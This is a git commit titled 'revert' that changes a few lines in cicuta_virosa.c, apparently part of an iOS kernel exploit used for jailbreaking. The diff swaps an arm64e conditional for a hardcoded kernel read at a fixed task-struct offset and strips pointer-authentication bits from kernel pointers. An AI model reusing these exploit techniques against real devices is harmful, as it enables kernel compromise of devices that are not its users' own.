3f9e47cd914965c919c2e38336c11ad928876f4e
K0stad1n <razer.saiso@gmail.com>
2021-02-16 15:53:14 +0100

    revert

--- Sources/cicutavirosawrap/cicuta_virosa.c
+++ Sources/cicutavirosawrap/cicuta_virosa.c
@@ -377,13 +377,13 @@ stage1:
     cicuta_log("task PAC: 0x%llx", task_pac);
     uint64_t task = task_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", task_pac, task);
-    #ifdef __arm64e__
+    /*#ifdef __arm64e__
         printf("detected arm64e!");
         uint64_t proc_pac = read_64(task + 0x3A0);
     #else
         uint64_t proc_pac = read_64(task + 0x390);
-    #endif
-    //uint64_t proc_pac = read_64(task + 0x3A0);
+    #endif*/
+    uint64_t proc_pac = read_64(task + 0x3A0);
     cicuta_log("proc PAC: 0x%llx", proc_pac);
     uint64_t proc = proc_pac | 0xffffff8000000000;
     cicuta_log("PAC decrypt: 0x%llx -> 0x%llx", proc_pac, proc);
